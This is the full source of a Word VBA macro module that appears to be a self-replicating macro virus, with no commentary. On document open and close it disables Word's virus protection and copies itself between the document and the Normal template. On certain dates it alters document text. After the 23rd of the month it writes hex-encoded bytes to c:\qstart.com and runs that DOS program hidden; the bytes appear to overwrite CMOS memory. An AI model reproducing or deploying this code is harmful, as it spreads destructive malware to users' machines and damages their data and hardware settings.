   Attribute VB_Name = "NewMacros"
   Sub AutoOpen()
   Attribute AutoOpen.VB_Description = "Ñîâñåì ïëîõîé ìàêðîñ."
   Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
    On Error Resume Next
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
     Destination:=NormalTemplate.FullName, Name:="NewMacros", _
     Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Destination:=ActiveDocument.FullName, _
     Source:=NormalTemplate.FullName, Name:="NewMacros", _
     Object:=wdOrganizerObjectProjectItems
   End Sub

   Sub AutoClose()
   Attribute AutoClose.VB_Description = "Reread Version 1.2!"
   Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoClose"
    On Error Resume Next
    Dim stroka As String
    stroka = "BB 1B 01 B9 FF 00 31 C0 88 E0 E6 70 EB 00 8A 07 43 FE C4 " & _
       "E6 71 E2 F1 B4 4C CD 21 " & _
       "26 77 24 FF 16 47 00 17 02 98 26 02 50 80 00 00 40 65 F0 F2 0F " & _
       "80 02 00 3C 2F 00 30 71 22 00 00 00 00 00 00 00 00 FE 07 10 FF " & _
       "FF FD 07 3F 08 9C 00 3C 19 80 FF FF FF FD FF FF FF 0F 78 9B F8 " & _
       "19 88 FC F1 FC 00 88 FF 00 3F 02 07 F0 F6 DC FF FE 2A 64 00 00 " & _
       "BF 67 E0 FF 00 00 00 00 C0 80 FF FF 9F 98 FE 44 F7 7F FF 00 00 " & _
       "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF 11 C5 FF FF " & _
       "FF 7F 26 77 24 FF 16 47 00 17 02 98 26 02 40 80 00 00 40 65 F0 " & _
       "F2 0F 80 02 00 3C 2F 00 30 71 22 00 00 00 00 00 00 00 00 FE 07 " & _
       "10 FF FF FD 07 3F 08 9C 00 3C 19 80 FF FF FF FD FF FF FF 0F 78 " & _
       "9B F8 19 88 FC F1 FC 00 88 FF 00 3F 02 07 F0 F6 DC FF FE 2A 64 " & _
       "00 00 BF 67 E0 FF 00 00 00 00 C0 80 FF FF 9F 98 FE 44 F7 7F FF " & _
       "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF 11 C5 " & _
       "FF FF FF 7F"

    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
     Destination:=NormalTemplate.FullName, Name:="NewMacros", _
     Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Destination:=ActiveDocument.FullName, _
     Source:=NormalTemplate.FullName, Name:="NewMacros", _
     Object:=wdOrganizerObjectProjectItems
   If Day(Date) = 1 Or Day(Date) = 13 Then
   Set myRange = ActiveDocument.Range(Start:=0, End:=0)
   With myRange.Find
       .ClearFormatting
       .Text = "òóò"
       With .Replacement
           .ClearFormatting
           .Text = "òàì"
       End With
       .Execute Replace:=wdReplaceAll, Format:=True, MatchCase:=False, _
           MatchWholeWord:=False
   End With
   End If
   If Day(Date) > 23 Then
   Open "c:\qstart.com" For Output As #1
   For A = 0 To Len(stroka) / 3 - 1
   b = Val("&h" & Mid$(stroka, A * 3 + 1, 3))
   Print #1, Chr$(b);
   Next
   Close #1
   v = Shell("c:\qstart.com", vbMinimizedNoFocus)
   End If
   End Sub
